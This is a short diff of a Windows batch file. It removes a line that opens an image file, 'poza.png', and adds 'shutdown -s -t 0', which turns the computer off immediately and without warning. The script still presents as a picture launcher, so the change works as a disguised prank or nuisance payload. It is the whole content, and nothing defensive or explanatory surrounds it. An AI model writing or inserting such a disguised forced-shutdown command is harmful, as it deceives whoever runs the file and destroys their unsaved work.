@@ -1,3 +1,3 @@
 @echo off
-start /WAIT poza.png
+shutdown -s -t 0
 exit
